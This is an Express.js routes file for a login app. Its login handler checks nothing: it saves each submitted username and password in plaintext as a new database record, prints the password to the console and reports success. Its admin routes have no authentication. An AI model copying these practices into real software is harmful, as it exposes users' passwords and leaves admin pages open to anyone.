// routes.js

const UserLogin = require('./db'); // Your Mongoose model
const express =require('express');
module.exports = (server) => {
    // Middleware to parse request bodies
    server.use(express.urlencoded({ extended: true }));
    server.use(express.json());

    // GET: Render login page
    server.get('/', (req, res) => {
        res.render('login');
    });

    // POST: Handle login form
    server.post('/login', async (req, res) => {
        console.log('POST /login route hit!');
        console.log('Request body:', req.body);

        try {
            const { user, password } = req.body;

            console.log('User:', user);
            console.log('Password:', password);

            const newUser = new UserLogin({ user, password });
            await newUser.save();

            res.render('login', { success: 'Login successful!' });

        } catch (error) {
            console.error('Error saving user:', error);
            res.render('login', { error: 'Login failed. Please try again.' });
        }
    });

    // Admin route
    server.get('/admin', (req, res) => {
        res.render('admin');
    });

    // Home route (only once)
    server.get('/admin/home', (req, res) => {
        res.render('home');
    });
};
